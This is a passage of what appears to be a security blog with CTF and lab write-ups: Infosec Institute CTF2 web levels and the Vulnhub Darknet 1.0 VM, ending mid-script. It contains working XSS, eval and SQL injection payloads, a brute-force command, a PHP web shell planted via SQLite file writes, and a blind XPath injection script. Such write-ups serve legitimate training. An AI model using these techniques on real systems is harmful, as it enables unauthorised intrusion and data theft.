        <img src="http://i.imgur.com/f5KzFDx.png" />
    
    
</figure>


<p>The field has a regular expression premitting only upper or lowercase characters. I can either
delete this or just change it to <code>.+</code> so it matches any character.</p>

<p>Now resubmitting the XSS payload works and the string is reflected on the page:</p>


<figure >
    
        <img src="http://i.imgur.com/yvSc4To.png" />
    
    
</figure>


<p>However, there&rsquo;s no pop up. So there must be something else validating input. Heading back to the
source I find some javscript in <code>ex1.js</code> which contains the following code:</p>

<p><a href="http://i.imgur.com/VVe74tW.png">
<figure >
    
        <img src="http://i.imgur.com/VVe74tW.png" />
    
    
</figure>
</a></p>

<p>The <code>siteName</code> variable has all <code>&lt;</code> and <code>&gt;</code> characters replaced with their equivalent html codes.
By clicking on the gutter in the source code I set a breakpoint on the line that does this, and resubmit
my data. The Firebug debugger breaks on the line and I step over it. Sure enough <code>siteName</code> is not
what I want it to be. Double clicking on the value in the right hand window allows me to edit it, and
revert it back to what I want it to be. Then clicking continue I am rewarded with:</p>


<figure >
    
        <img src="http://i.imgur.com/VEFDpio.png" />
    
    
</figure>


<h1 id="level-02:ad4b2a18d89fa2f20e1d964dd8f70255">Level 02</h1>

<p><a href="http://ctf.infosecinstitute.com/ctf2/exercises/ex2.php">Level 02</a> is a simple web calculator:</p>


<figure >
    
        <img src="http://i.imgur.com/asgTWCw.png" />
    
    
</figure>


<p>I&rsquo;m supposed to use the form to print <code>phpinfo</code> or other data to the page. This is a PHP
script evaluating a simple expression. I am guessing that it&rsquo;s going to be calling <code>eval</code>, as
that&rsquo;s a fairly common vulnerability, and fits to how the page works. After entering some numbers
and other characters into the two fields I quickly learn that the input for those fields is checked.
That means I can&rsquo;t enter anything but numbers into those fields. That leaves the operator as the only
other thing under our control.</p>

<p>I&rsquo;m going to guess that code looks somewhat like this:</p>

<div class="highlight" style="background: #272822"><pre style="line-height: 125%">eval (&quot;print $num1 $op $num2;&quot;);
</pre></div>


<p>So I need to change the operand to something that prints <code>phpinfo</code> but leaves the rest of the statement
valid. With Firebug I can edit the value of the operand to the following:</p>


<figure >
    
        <img src="http://i.imgur.com/8xnqMxv.png" />
    
    
</figure>


<p>Hit submit and&hellip;.</p>


<figure >
    
        <img src="http://i.imgur.com/rUgaixe.png" />
    
    
</figure>


<h1 id="level-03:ad4b2a18d89fa2f20e1d964dd8f70255">Level 03</h1>

<p><a href="http://ctf.infosecinstitute.com/ctf2/exercises/ex3.php">Level 03</a> provides me with a registration
form and a login form. The instructions indicate that the data is stored in a delimited file and I need
to sign up as a new user with admin rights.</p>


<figure >
    
        <img src="http://i.imgur.com/f0g5TmV.png" />
    
    
</figure>


<p>First things first, let&rsquo;s see if we can figure out the delimiter&hellip; Signing up and logging in
shows us our name and current role: <code>role:normal</code>. This already tells me that the delimiter is not
<code>:</code>. After fuzzing the input it turns out most characters are ok to use. So what&rsquo;s the delimeter?
I check the hints and it tells me that it&rsquo;s the newline character. Interesting, in my fuzzing I tried that,
but had no luck. Unless..</p>

<p>So let&rsquo;s not use <code>\n</code> but a real new line. I can achieve this by editing the source with Firebug
once again, changing the <code>lastname</code> field to a <code>textarea</code> type:</p>

<p><a href="http://i.imgur.com/QBVptMv.png">
<figure >
    
        <img src="http://i.imgur.com/QBVptMv.png" />
    
    
</figure>
</a></p>

<p>Now I can have multiple lines and enter a real carriage return into the field. My last
name will be</p>

<div class="highlight" style="background: #272822"><pre style="line-height: 125%">alpha7
role:admin
</pre></div>


<p>And after a login with the new creds:</p>


<figure >
    
        <img src="http://i.imgur.com/Akj9NL8.png" />
    
    
</figure>


<h1 id="level-04:ad4b2a18d89fa2f20e1d964dd8f70255">Level 04</h1>

<p><a href="http://ctf.infosecinstitute.com/ctf2/exercises/ex4.php">Level 04</a></p>

<p><a href="http://i.imgur.com/nmRe8U2.png">
<figure >
    
        <img src="http://i.imgur.com/nmRe8U2.png" />
    
    
</figure>
</a></p>

<p>Here we need to load a php file instead of the text files that load when you click
on the <em>Bio</em>, <em>Clients</em>, or <em>About</em> buttons. The instructions are very clear,
but it sounds like we need to load a phop file from the root of the domain. Let&rsquo;s
see what restrictions are in place.</p>

<p>Fuzzing the file parameter I notice that it seems to test for <code>fileNiXtxt</code> where <em>N</em> is
any number and <code>X</code> is any other character. Anything other than that pattern will print <code>Invalid file selected.</code>.</p>

<p>Entering <code>index.php;file1.txt</code> for example gives a different error: <code>There is something else that you must do.</code>.
Interesting. So I guess it just needs to be somewhere in that argument for the filter to accept it. But
how can we accomplish this with a valid payload?</p>

<p>One thing I tried was <code>/file1/txt/../../file.php</code> which wasn&rsquo;t right either. Here we make use
of relative paths where when PHP opens the file, it will ignore the fact that the path
<code>/file1/txt</code> doesn&rsquo;t exist and treat this as if <code>file.php</code> as at <code>/</code>.</p>

<p>UPDATE: Solved</p>

<p>So the key bit I was missing was that it wanted a remote, even if that remote is the
same domain as the current page. So I added <code>http://infosecinstitute.com/file3.php</code> as
the argument to get a new error: <em>You are trying to add a remote URL.</em> Ok, now we are getting somewhere.
As one of the hints is that the regex might be case sensitive, let&rsquo;s capitalise the <code>h</code> in <code>http</code>.
This time we get an <em>invalid file</em> message, so that bypass worked. Now we need to satisfy the
<code>file3.txt</code> requirement and using <code>Http://infosecinstitute.com/file3.txt.php</code> I get the flag</p>

<p><a href="http://i.imgur.com/WTFYtJi.png">
<figure >
    
        <img src="http://i.imgur.com/WTFYtJi.png" />
    
    
</figure>
</a></p>

<h1 id="level-05:ad4b2a18d89fa2f20e1d964dd8f70255">Level 05</h1>

<p><a href="http://ctf.infosecinstitute.com/ctf2/exercises/ex5.php">Level 05</a> starts by telling
me that I am not logged in.</p>


<figure >
    
        <img src="http://i.imgur.com/BOBdkHX.png" />
    
    
</figure>


<p>Well, I don&rsquo;t remember logging in, so that&rsquo;s not unusual. What is unusual is
that the <code>login</code> button doesn&rsquo;t work. I&rsquo;ll quickly check the source code and notice
that it&rsquo;s disabled, but also that it points to <code>login.html</code>. Enabling and clicking it
takes me to a 404, so no go. The vulnerability here is <em>Missing Function Level Access Control</em>
so perhaps this page assumes we&rsquo;re logged in if we are coming from the login page. Let&rsquo;s
assume that if the user is successful on <code>login.html</code>, that page will redirect here, and then
this page will just assume that the user is allowed to be here.</p>

<p>Using an intercepting proxy I&rsquo;ll edit the <code>Referer</code> field in the original request, so that
it appears to be coming from the login page:</p>


<figure >
    
        <img src="http://i.imgur.com/EK9u7Ir.png" />
    
    
</figure>


<p>Forward the request and</p>


<figure >
    
        <img src="http://i.imgur.com/QCisDvN.png" />
    
    
</figure>


<h1 id="level-06:ad4b2a18d89fa2f20e1d964dd8f70255">Level 06</h1>

<p><a href="http://ctf.infosecinstitute.com/ctf2/exercises/ex6.php">Level 06</a> shows a nice
big text area with allowable HTML tags.</p>


<figure >
    
        <img src="http://i.imgur.com/Waq1AVN.png" />
    
    
</figure>


<p>This time I need to perform a cross site request forgery. This can be accomlished by an <code>href</code>
tag, but trying this tells me that they are expecting something that will perform the request
without the need for user interaction. Ok, fine, let&rsquo;s revisit the allowed tags. <code>img</code> looks useful, right?</p>

<p>Let&rsquo;s try the following</p>


<figure >
    
        <img src="http://i.imgur.com/qCd5NUP.png" />
    
    
</figure>


<p>Yep, that&rsquo;s what we needed.</p>

<h1 id="level-07:ad4b2a18d89fa2f20e1d964dd8f70255">Level 07</h1>

<p><a href="http://ctf.infosecinstitute.com/ctf2/exercises/ex7.php">Level 07</a> is a login form on which
we need to perform another XSS attack.</p>


<figure >
    
        <img src="http://i.imgur.com/WO8dRpe.png" />
    
    
</figure>


<p>Well, lucky for me I perform these challenges through a proxy which unhides hidden fields like
the one you see there. Some investigation shows that the value of the hidden field comes from
a php_self value. That is it uses whatever the URL part is to populate the field, so that form
is submitted back to itself.</p>

<p>Using this we can inject something into the field to hopefully reflect our data on the page.
By employing the <code>arg</code> paramater we can close the <code>input</code> tag, and the inject our <code>h1</code> tags:</p>

<div class="highlight" style="background: #272822"><pre style="line-height: 125%">http://ctf.infosecinstitute.com/ctf2/exercises/ex7.php?arg=&#39;&gt;&lt;h1&gt;username&lt;/h1&gt;
</pre></div>


<p>Submitting that puts <code>username</code> on the page surrounded by <code>h1</code> tags and nabs the flag</p>

<h1 id="level-08:ad4b2a18d89fa2f20e1d964dd8f70255">Level 08</h1>

<p><a href="http://ctf.infosecinstitute.com/ctf2/exercises/ex8.php">Level 08</a></p>


<figure >
    
        <img src="http://i.imgur.com/610ZNNq.png" />
    
    
</figure>


<p>Here we need to upload an image that will produce a javscript alert. First things first with these
things I upload an image to see how it behaves. Once uploaded I click on the example links and notice that
images are fetched via an id. The URL is</p>

<div class="highlight" style="background: #272822"><pre style="line-height: 125%">http://ctf.infosecinstitute.com/ctf2/exercises/ex8.php?attachment_id=1
</pre></div>


<p>So let me see if I can access an image via another ID, for example <code>id=4</code>.
I get the message:</p>

<div class="highlight" style="background: #272822"><pre style="line-height: 125%">This attachment is currently under review by our editors. 
</pre></div>


<p>So no. Checking out the image URL for one of the chess images shows me that the images
are stored at <code>http://ctf.infosecinstitute.com/ctf2/ex8_assets/img/chess1.png</code> for example.</p>

<p>I make a note of this.</p>

<p>Now can I just upload an html file? That gives me an error of an invalid file type. So let me chack
if it&rsquo;s just checking the extension or if there&rsquo;s something more happening. Intercepting the upload
request with Burp proxy I can change the extension to <code>jpg</code> and sucessfully upload the html file.</p>

<p>Now browsing to the image url I am told it cannot display the image due to errors. Well, the browser
is trying to interpret the file as an image, which it clearly isn&rsquo;t. There&rsquo;s got to be another way
to get at my image. How about the object reference in the URL <code>http://ctf.infosecinstitute.com/ctf2/exercises/ex8.php?attachment_id=1</code>
for example? Maybe if I just reference the filename directly?</p>

<div class="highlight" style="background: #272822"><pre style="line-height: 125%">http://ctf.infosecinstitute.com/ctf2/exercises/ex8.php?file=index.jpg
</pre></div>


<p>Success</p>

<p><a href="http://i.imgur.com/RVoJGMr.png">{ %img http://i.imgur.com/RVoJGMr.png %}</a></p>

<h1 id="level-09:ad4b2a18d89fa2f20e1d964dd8f70255">Level 09</h1>

<p><a href="http://ctf.infosecinstitute.com/ctf2/exercises/ex9.php">Level 09</a> starts off by showing me the
details of one John Doe.</p>


<figure >
    
        <img src="http://i.imgur.com/8NESmpB.png" />
    
    
</figure>


<p>I need to change something to make it show the details for Mary Jane. There&rsquo;s no URL parms,
no login, so how can the page know who to show? There&rsquo;s one place left: the cookie jar.</p>

<p>Using Firebug once again I inspect the cookies and sure enough</p>


<figure >
    
        <img src="http://i.imgur.com/xGdtDa7.png" />
    
    
</figure>


<p>This is &ldquo;JOHN+DOE&rdquo; encoded as base64 as it turns out. One thing to note is when you</p>

<div class="highlight" style="background: #272822"><pre style="line-height: 125%">echo Sk9ITitET0u= | base64 -d
</pre></div>


<p>there is no newline at end of the name. So to encode <code>MARY+JANE</code> correctly I need to
use echo with the <code>-n</code> flag:</p>

<div class="highlight" style="background: #272822"><pre style="line-height: 125%">$&gt; <span style="color: #f8f8f2">echo</span> -n MARY+JANE <span style="color: #f8f8f2">|</span> base64
TUFSWStKQU5F
</pre></div>


<p>Editing the cookie and inserting that base64 string will show us Mary Jane&rsquo;s details.</p>

<h1 id="level-10:ad4b2a18d89fa2f20e1d964dd8f70255">Level 10</h1>

<p><a href="http://ctf.infosecinstitute.com/ctf2/exercises/ex10.php">Level 10</a> is a game and we need to
edit its source so we look like we&rsquo;re really good at it.</p>


<figure >
    
        <img src="http://i.imgur.com/g03njlQ.png" />
    
    
</figure>


<p>Entering anything in the name I field I have a poke around to see how the whole thing
works. We&rsquo;re shown some coloured squares and then they are turn over. We need to then
remember which colour each square had. Except we need to do it at least 9999 times and
at the extreme level, which only shows us the squares for a second.</p>

<p>Finding the square colours isn&rsquo;t hard. With Firebug we can see:</p>


<figure >
    
        <img src="http://i.imgur.com/isDO7LM.png" />
    
    
</figure>


<p>and those numbers are 0 indexed into the list of numbers from the selction popup. So playing
along I can win one game. So let&rsquo;s find out where my current win/loss count is stored.</p>

<p>In the Javscript I find a structure that does this:</p>


<figure >
    
        <img src="http://i.imgur.com/gZghIIn.png" />
    
    
</figure>


<p>but all this does is increment and decrement the values. Clearly that data is stored somewhere.
Turns out that this <code>localstorage</code> is in the DOM. Using the <em>DOM</em> tab in Firebug I can find
the structure and its data:</p>

<p>
<figure >
    
        <img src="http://i.imgur.com/xGIZXpb.png" />
    
    
</figure>
</p>

<p>Now I can edit the number of wins and then, all I need to do is play one more game to take the flag.</p>

<h1 id="level-11:ad4b2a18d89fa2f20e1d964dd8f70255">Level 11</h1>

<p><a href="http://ctf.infosecinstitute.com/ctf2/exercises/ex11.php">Level 11</a> blacklists me</p>

<p>
<figure >
    
        <img src="http://i.imgur.com/RaGy98O.png" />
    
    
</figure>
</p>

<p>Awwwww I was having such fun. But how? Not from my IP, as that&rsquo;s going to change. First thing
to check: cookie jar. Yay!</p>

<p>
<figure >
    
        <img src="http://i.imgur.com/QgGrvwE.png" />
    
    
</figure>
</p>

<p>There it is, a big <code>no</code>. I&rsquo;ll change that to a <code>yes</code>, reload and take the flag, thanks very much.</p>

<h1 id="level-12:ad4b2a18d89fa2f20e1d964dd8f70255">Level 12</h1>

<p><a href="http://ctf.infosecinstitute.com/ctf2/exercises/ex12.php">Level 12</a> is a bruteforce challange. No
login attempt limits, no rate limits, so it&rsquo;s ripe for the picking.</p>

<p>
<figure >
    
        <img src="http://i.imgur.com/LMUBNoq.png" />
    
    
</figure>
</p>

<p>After searching for the suggested password list, the first hit is the Openwall password list for
john the ripper. So why not download it and give it a try?</p>

<p>I fire up <code>wfuzz</code> with the following commandline</p>

<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%">$&gt; wfuzz -c -z file,/usr/share/wordlists/password-2011.lst --hw Incorrect -d <span style="color: #e6db74">&quot;username=admin&amp;password=FUZZ&amp;logIn=Login&quot;</span> <span style="color: #e6db74">&quot;http://ctf.infosecinstitute.com/ctf2/exercises/ex12.php&quot;</span>
</pre></div>
</p>

<p>Within a few seconds I get a hit with <code>princess</code>. Enter that with the username <code>admin</code> and onto the next level</p>

<h1 id="level-13:ad4b2a18d89fa2f20e1d964dd8f70255">Level 13</h1>

<p><a href="http://ctf.infosecinstitute.com/ctf2/exercises/ex13.php?redirect=ex13-task.php">Level 13</a> is actually
redirect to <code>ex13-task.php</code>. I need to make the redirect point to an external page so that to another user
it looks like they are visiting <code>ctf.infosecinstitute.com</code> but are infact taken to another site</p>

<p>
<figure >
    
        <img src="http://i.imgur.com/jNgQ4Ww.png" />
    
    
</figure>
</p>

<p>Well the obvious thing is just to try and type in another URL <code>http://ctf.infosecinstitute.com/ctf2/exercises/ex13.php?redirect=http://unlogic.co.uk</code>
but that gives me an error. Hrmm&hellip; trying a few other redirect options tells me that the redirect is URL
relative, which means if I strip off the protocol off the URL, I should be able to make this work:</p>

<p><a href="http://i.imgur.com/QM7V8Dk.png">
<figure >
    
        <img src="http://i.imgur.com/QM7V8Dk.png" />
    
    
</figure>
</a></p>

<p>Sure enough, that worked. That&rsquo;s it, the final flag.</p>

<p>Thanks to the Infosec Institute for another great CTF!</p>

  </div>
  
  <div class="post">
    <h1 class="post-title">
      <a href="http://unlogic.co.uk/2015/06/08/vulnhub-darknet1-dot-0-write-up/">
        Vulnhub Darknet1.0 write up
      </a>
    </h1>

    <span class="post-date">Mon, Jun 8, 2015</span>

    

<p><a href="https://www.vulnhub.com/entry/darknet-10,120/">Darknet 1.0</a> by <a href="https://www.vulnhub.com/author/q3rv0,111/">q3rv0</a>
isn&rsquo;t easy&hellip; for me anyway.</p>

<p>With some help and lots of reading I did however get to the bottom of it.</p>

<p>Here&rsquo;s my journey</p>

<h1 id="stage-1:3817275722f75303351ad52bb23d8c3d">Stage 1</h1>

<p>First things first: scan the target</p>

<div class="highlight" style="background: #272822"><pre style="line-height: 125%">root@kali:~# nmap -sV -p- 192.168.56.106

Starting Nmap 6.47 ( http://nmap.org ) at 2015-06-03 12:57 BST
Nmap scan report for darknet.com (192.168.56.106)
Host is up (0.00017s latency).
Not shown: 65532 closed ports
PORT      STATE SERVICE VERSION
80/tcp    open  http    Apache httpd 2.2.22 ((Debian))
111/tcp   open  rpcbind 2-4 (RPC #100000)
57664/tcp open  status  1 (RPC #100024)
MAC Address: 08:00:27:E5:9F:EC (Cadmus Computer Systems)

Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.86 second
</pre></div>


<p>Not much to be had here other than a web server. Poking at the RPC ports
didn&rsquo;t give any results. Browsing to the IP shows me:</p>


<figure >
    
        <img src="http://i.imgur.com/b513tfj.png" />
    
    
</figure>


<p>There&rsquo;s no <code>robots.txt</code> so nothing left to do but run <code>dirbuster</code> on it. Using the
<code>directory-list-2.3-medium.txt</code> I&rsquo;m rewarded with some directories and files that
might be of interest</p>


<figure >
    
        <img src="http://i.imgur.com/dNQnSQy.png" />
    
    
</figure>


<p>I downloaded the <code>888.darknet.com.backup</code> file and took a look at it.</p>

<div class="highlight" style="background: #272822"><pre style="line-height: 125%">&lt;VirtualHost *:80&gt;
    ServerName 888.darknet.com
    ServerAdmin devnull@darknet.com
    DocumentRoot /home/devnull/public_html
    ErrorLog /home/devnull/logs
&lt;/VirtualHost&gt;
</pre></div>


<p>Hrmm.. a virtual host configuration. I added <code>192.168.56.106 888.darknet.com</code> to my local <code>/etc/hosts</code>
and then pointed my browser to <code>888.darknet.com</code> to be presented with this:</p>


<figure >
    
        <img src="http://i.imgur.com/PcMHBLd.png" />
    
    
</figure>


<p>Initial thoughts are SQLi, so  I started with some simple SQL injections to see
if my hunch is correct. Entering a username like <code>' or '1'='1</code>
yields an <em>Ilegal</em>[sic] message. So this means two things: 1) SQLi is very
probably here becasue 2) our input is filtered. I didn&rsquo;t fancy working out
what chars I can and can&rsquo;t use so I made a script to do that for me</p>

<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><span style="color: #75715e">#!/usr/bin/python</span>

<span style="color: #f92672">import</span> <span style="color: #f8f8f2">requests</span>
<span style="color: #f92672">import</span> <span style="color: #f8f8f2">string</span>
<span style="color: #f92672">import</span> <span style="color: #f8f8f2">re</span>

<span style="color: #66d9ef">def</span> <span style="color: #a6e22e">testit</span><span style="color: #f8f8f2">(c):</span>
    <span style="color: #f8f8f2">url</span> <span style="color: #f92672">=</span> <span style="color: #e6db74">&#39;http://888.darknet.com/index.php&#39;</span>
    <span style="color: #f8f8f2">payload</span> <span style="color: #f92672">=</span> <span style="color: #e6db74">&#39;username=%s&amp;password=%s&amp;Action=Login&#39;</span> <span style="color: #f92672">%</span> <span style="color: #f8f8f2">(c,</span> <span style="color: #f8f8f2">c)</span>

    <span style="color: #f8f8f2">r</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">requests</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">post(url,</span> <span style="color: #f8f8f2">data</span><span style="color: #f92672">=</span><span style="color: #f8f8f2">payload)</span>
    <span style="color: #f8f8f2">m</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">re</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">search(</span><span style="color: #e6db74">&#39;.*Ilegal.*&#39;</span><span style="color: #f8f8f2">,</span> <span style="color: #f8f8f2">r</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">text)</span>
    <span style="color: #66d9ef">if</span> <span style="color: #f8f8f2">m:</span>
        <span style="color: #66d9ef">print</span> <span style="color: #e6db74">&#39;%s</span><span style="color: #ae81ff">\t</span><span style="color: #e6db74">Illegal&#39;</span> <span style="color: #f92672">%</span> <span style="color: #f8f8f2">c</span>
    <span style="color: #66d9ef">else</span><span style="color: #f8f8f2">:</span>
        <span style="color: #66d9ef">print</span> <span style="color: #e6db74">&#39;%s</span><span style="color: #ae81ff">\t</span><span style="color: #e6db74"> OK&#39;</span> <span style="color: #f92672">%</span> <span style="color: #f8f8f2">c</span>

<span style="color: #66d9ef">for</span> <span style="color: #f8f8f2">c</span> <span style="color: #f92672">in</span> <span style="color: #f8f8f2">string</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">punctuation:</span>
    <span style="color: #f8f8f2">testit(c)</span>
</pre></div>


<p>which yielded the following as illegal characters.</p>

<div class="highlight" style="background: #272822"><pre style="line-height: 125%">,	Illegal
-	Illegal
;	Illegal
&lt;	Illegal
=	Illegal
&gt;	Illegal
</pre></div>


<p>everything else was fair game. Well almost everything, some SQL commands aren&rsquo;t
allowed either. But I&rsquo;ve got enough to work with.
I have a good idea that <code>devnull</code> is a valid user, so I&rsquo;ll try to use that
info. I enter <code>devnull'/*</code> as a username hoping I am creating a query like
<code>SELECT * FROM users WHERE username='devnull'/* AND password='xxxx';</code>. Hitting
the login button confirms my input is correct.</p>

<p>I should mention here that the VM has a bug in it so that even if you get the sqli
right, it will redirect you back to <code>index.php</code>.  Noticed this in Burp as it
was redirection to <code>main.php</code> after the correct SQLi, but then
going back to <code>index.php</code>. A full reinstall of the VM will fix this, or reverting to
an earlier snapshot will also work.</p>

<p>Ok, so now I get</p>

<h1 id="stage-2:3817275722f75303351ad52bb23d8c3d">Stage 2</h1>


<figure >
    
        <img src="http://i.imgur.com/joaBvqT.png" />
    
    
</figure>


<p>Whatever I enter here just goes somewhere without any feedback. This is completely blind
and will be a bit of a challenge.</p>

<p>While I was unaware of the bug I mentioned earier, I ended up entering a lot of different characters into the
login form. An interesting response comes when you enter <code>'</code> for the username with any pass:
<code>unrecognized token: &quot;3590cb8af0bbb9e78c343b52b93773c9&quot;</code>. This is the md5 of the password.
Using a number like <code>1</code> for the password with <code>'</code> as the username gives
this error <code>near &quot;c4ca4238a0b923820dcc509a6f75849b&quot;: syntax error</code>
These errors indicate that this is in fact a SQLite DB. This information will help me with the admin console
as I now know what I am working with. This also confirms my earlier suspicion about what the query looks
like.</p>

<p>One useful feature of SQLite that I can exploit in this case, is its ability to create files on disk.
To leverage this, I need to find is a folder where I have permission to write files to.
I ran <code>dirbuster</code> again and now have a few directories to try</p>


<figure >
    
        <img src="http://i.imgur.com/zlFz06Y.png" />
    
    
</figure>


<p>In order to create a file with SQLite I need to attach the file in question as a database.
So I set about running commands like this</p>

<div class="highlight" style="background: #272822"><pre style="line-height: 125%">attach database &#39;/home/devnull/public_html/test.php&#39; as db;                
drop table if exists db.test;                                                    
create table db.test(payload text);                                              
insert into db.test(payload) values(&#39;&lt;?php phpinfo(); ?&gt;&#39;);
</pre></div>


<p>From the Apache config I downloaded at the start, I know that the webroot is <code>/home/devnull/public_html</code>,
so any directories I got back from dirbuster will be a subdirectory of that.
I try all the folders until I got a hit with the <code>img</code> directory. So I&rsquo;ve got a place to
create files, but the bad news is that <code>exec</code>, <code>eval</code>, and its ilk are disabled.
This means no simple php shell. Boooo.</p>

<p>Not to worry, I got this. I knocked up a quick PHP script to do some work for me</p>

<div class="highlight" style="background: #272822"><pre style="line-height: 125%">if ($_GET[&quot;cmd&quot;] == &quot;db&quot;) {                                                     
    $dbhandler=new SQLite3(&quot;/home/devnull/database/888-darknet.db&quot;);            
                                                                                
    $query = $dbhandler-&gt;query(&quot;SELECT * FROM login&quot;);                          
                                                                                
    while($result=$query-&gt;fetchArray()){                                        
        print_r($result);                                                       
        print &quot;&lt;br/&gt;&quot;;                                                          
    }                                                                           
}                                                                               
                                                                                
if ($_GET[&quot;cmd&quot;] == &quot;ls&quot;) {                                                     
    $path = $_GET[&quot;arg&quot;];                                                       
    @chdir($path);                                                              
    $dir = @dir($path);                                                         
    while($d = $dir-&gt;read()) {                                                  
        print $d.&quot;&lt;br/&gt;&quot;;                                                       
    }                                                                           
}                                                                               
if ($_GET[&quot;cmd&quot;] == &quot;cat&quot;) {                                                    
    $file = $_GET[&quot;arg&quot;];                                                       
    $fh = fopen($file, &quot;r&quot;);                                                    
    if ($fh) {                                                                  
        while ($l = fgets($fh)) {                                               
            print htmlspecialchars($l).&quot;&lt;br/&gt;&quot;;                                 
        }                                                                       
        fclose($fh);                                                            
    } else { print &quot;Cannot open &quot;.$file.&quot;&lt;br/&gt;&quot;; }                              
} 
</pre></div>


<p>I use this as the payload in the <code>INSERT</code> statement.</p>

<p>With the <code>cmd</code> parameter I can now list directories and cat files. The database
details were added once I had got the details from the db file in the <code>includes</code> folder.</p>

<p>I scoped around the server a bit, looking in the usual interesting folders, seeing if there&rsquo;s
anything useful. Eventually I found something interesting in the Apache
config folder. There&rsquo;s another virtual host on this machine at <code>signal8.darknet.com</code>.</p>

<p>Before I go on, I best mention <a href="https://github.com/dotcppfile/DAws">DAws</a> which
will make your life super easy. I crafted a file uploader in PHP which I put on the
server with the SQL admin trick above, and then uploaded the <code>DAws.php</code> file. This
will drop a <code>php.ini</code> on the server that allows you to run commands, and also create
a reverse shell to your host. <strong>Much</strong> easier than what I did, but you learn new things
all the time. This will be the PHP script I&rsquo;ll be using going forward.</p>

<h1 id="stage-3:3817275722f75303351ad52bb23d8c3d">Stage 3</h1>

<p>Ok, so now I&rsquo;m looking at the list of Darknet staff. Clicking on the usernames will take
me to a php page showing me that user&rsquo;s email. While I ponder the significance of this
I check for a robots.txt file and this time there is one. It lists a directory
called <code>xpanel</code> which prompts me for another username and password combo.
No SQLi here though I&rsquo;m afraid. I cannot bruteforce this either. Well I <em>could</em>
but I don&rsquo;t think I&rsquo;ll get a hit any time soon.</p>

<p>Fastforward and I&rsquo;m stuck. After chatting to <em>g0blin</em> I get a hint that the <code>contact.php</code> is
a key. I start attempting to inject stuff into the <code>id</code> field. Eventually I notice that I am
not looking at the same DB. The ids don&rsquo;t match with what I saw before when I dumped the DB.
This is a new data store. But what is it?
SQL wasn&rsquo;t getting me anywhere so I leafed through books and notes and figured it could be
XML. If it is, it will most likely be something like <code>...user/id=1]</code> Adding <code>][1</code> at the end will
return the first and only result, and we should get the email as per normal.
Adding <code>[2</code> will error and return nothing as there should only be one result. If this works
I can be fairly certain that this is an XPath query.</p>


<figure >
    
        <img src="http://i.imgur.com/7jRrIo0.png" />
    
    
</figure>


<p>Excellent, it worked. Now I need to figure out how to make use of this. XPath isn&rsquo;t
something I&rsquo;ve come across very often.</p>

<p>So I begin to experiment. First off I figured out if it&rsquo;s XPath V2 or XPath V1.
If entering <code>id=1 or count(//*)][1</code> doesn&rsquo;t work, but <code>id=1 lower-case('A')][1</code> does,
then it&rsquo;s XPath V2, otherwise it&rsquo;s XPath V1.</p>

<p>While I played around with this something clicked in my head and I groked enough of XPi
(XPath injection) to get to the bottom of this. Using the truth from above we can
determine the xpath names using the <code>substring</code> function. I wrote another python
script to do the heavy lifting</p>

<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><span style="color: #f92672">import</span> <span style="color: #f8f8f2">requests</span>
<span style="color: #f92672">import</span> <span style="color: #f8f8f2">string</span>
<span style="color: #f92672">import</span> <span style="color: #f8f8f2">sys</span>


<span style="color: #f8f8f2">path</span> <span style="color: #f92672">=</span> <span style="color: #e6db74">&#39;&#39;</span>
<span style="color: #66d9ef">if</span> <span style="color: #f8f8f2">len(sys</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">argv)</span> <span style="color: #f92672">&gt;</span> <span style="color: #ae81ff">1</span><span style="color: #f8f8f2">:</span>
    <span style="color: #f8f8f2">path</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">sys</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">argv[</span><span style="color: #ae81ff">1</span><span style="color: #f8f8f2">]</span>

<span style="color: #f8f8f2">URL</span> <span style="color: #f92672">=</span> <span style="color: #e6db74">&#39;http://signal8.darknet.com/contact.php&#39;</span>
<span style="color: #f8f8f2">payload_tpl</span> <span style="color: #f92672">=</span> <span style="color: #e6db74">&quot;1 and substring(name(%s),%d,1)=&#39;%s&#39;][1&quot;</span>

<span style="color: #f8f8f2">name</span> <span style="color: #f92672">=</span> <span style="color: #e6db74">&#39;&#39;</span>
<span style="color: #f8f8f2">cmp_pos</span> <span style="color: #f92672">=</span> <span style="color: #ae81ff">1</span>
<span style="color: #f8f8f2">carry_on</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">True</span>

<span style="color: #66d9ef">while</span> <span style="color: #f8f8f2">carry_on:</span>

    <span style="color: #f8f8f2">carry_on</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">False</span>
    <span style="color: #66d9ef">print</span> <span style="color: #f8f8f2">name</span>
    <span style="color: #66d9ef">for</span> <span style="color: #f8f8f2">c</span> <span style="color: #f92672">in</span> <span style="color: #f8f8f2">string</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">ascii_letters:</span>
        <span style="color: #f8f8f2">payload</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">{</span><span style="color: #e6db74">&#39;id&#39;</span><span style="color: #f8f8f2">:</span> <span style="color: #f8f8f2">payload_tpl</span> <span style="color: #f92672">%</span> <span style="color: #f8f8f2">(path,cmp_pos,c)}</span>

        <span style="color: #f8f8f2">r</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">requests</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">get(URL,</span> <span style="color: #f8f8f2">params</span><span style="color: #f92672">=</span><span style="color: #f8f8f2">payload)</span>
        <span style="color: #66d9ef">if</span> <span style="color: #f8f8f2">r</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">text</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">find(</span><span style="color: #e6db74">&#39;errorlevel&#39;</span><span style="color: #f8f8f2">)</span> <span style="color: #f92672">!=</span> <span style="color: #f92672">-</span><span style="color: #ae81ff">1</span><span style="color: #f8f8f2">:</span>
            <span style="color: #f8f8f2">name</span> <span style="color: #f92672">+=</span> <span style="color: #f8f8f2">c</span>
            <span style="color: #f8f8f2">carry_on</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">True</span>
